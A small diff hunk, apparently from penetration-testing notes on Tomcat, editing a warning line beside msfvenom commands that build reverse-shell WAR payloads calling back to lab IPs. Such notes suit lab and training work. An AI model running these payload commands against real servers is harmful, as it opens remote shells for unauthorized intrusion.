@@ -83,7 +83,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.122 LPORT=443 -f war -o
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > revshell.war
 ```
 
-> ⚠️ For Windows payloads, make sure the target Tomcat server supports deploying `.exe` via WAR (less common, more of a wrapper trick).
+> ⚠️ For Windows payloads, make sure the target Tomcat server supports deploying `.exe` via WAR.
 
 ---
 
